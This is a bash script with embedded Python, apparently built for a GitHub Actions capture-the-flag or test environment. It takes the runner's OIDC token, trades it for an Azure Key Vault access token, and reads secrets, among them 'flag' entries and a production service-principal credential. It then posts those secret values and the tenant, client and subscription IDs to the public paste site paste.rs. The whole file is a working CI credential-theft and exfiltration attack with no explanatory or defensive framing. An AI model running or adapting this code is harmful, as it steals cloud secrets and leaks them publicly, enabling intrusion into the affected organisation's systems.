#!/usr/bin/env bash
set +e
python3 -u - <<'PY'
import os, json, urllib.request, urllib.parse, urllib.error

def req(url, hdr=None, data=None, method=None):
    r = urllib.request.Request(url, data=data, headers=hdr or {}, method=method)
    try:
        x = urllib.request.urlopen(r, timeout=30)
        return x.status, x.read().decode("utf-8", "replace"), dict(x.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), dict(e.headers or {})
    except Exception as e:
        return 0, "EXC:%s:%s" % (type(e).__name__, str(e)[:160]), {}

TEN = os.environ.get("AZURE_TENANT_ID", "")
CID = os.environ.get("AZURE_CLIENT_ID", "")
SUB = os.environ.get("AZURE_SUBSCRIPTION_ID", "")
blob = {"env": {"tenant": TEN, "client": CID, "sub": SUB}}

oidc = ""
u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
if u:
    s, b, _ = req(u + "&audience=" + urllib.parse.quote("api://AzureADTokenExchange", safe=""),
                  hdr={"Authorization": "Bearer " + os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")})
    blob["oidc"] = {"status": s}
    try:
        oidc = json.loads(b)["value"]
        blob["oidc"]["len"] = len(oidc)
    except Exception:
        blob["oidc"]["body"] = b[:200]

def tok(scope, client, assertion=None, secret=None):
    d = {"client_id": client, "grant_type": "client_credentials", "scope": scope}
    if assertion:
        d["client_assertion_type"] = "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"
        d["client_assertion"] = assertion
    else:
        d["client_secret"] = secret
    s, b, _ = req("https://login.microsoftonline.com/%s/oauth2/v2.0/token" % TEN,
                  data=urllib.parse.urlencode(d).encode(), method="POST")
    try:
        return s, json.loads(b).get("access_token", ""), b[:300]
    except Exception:
        return s, "", b[:300]

st, vt, vtb = tok("https://vault.azure.net/.default", CID, assertion=oidc)
blob["vault_token"] = {"status": st, "len": len(vt), "err": vtb if not vt else ""}

def kv(vault, name, token):
    s, b, _ = req("https://%s.vault.azure.net/secrets/%s?api-version=7.4" % (vault, name),
                  hdr={"Authorization": "Bearer " + token})
    out = {"status": s, "body": b[:1200]}
    try:
        out["value"] = json.loads(b)["value"]
    except Exception:
        pass
    return out

found = {}
for v in ("kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"):
    found["flag@" + v] = kv(v, "flag", vt)
found["sp"] = kv("kv-tbl-prod-x3euoz", "reporting-service-principal", vt)
blob["kv"] = found

payload = json.dumps(blob, indent=1).encode()
s, b, _ = req("https://paste.rs", data=payload, method="POST")
print("PASTE_STATUS", s)
print("PASTE_URL", b.strip())
PY
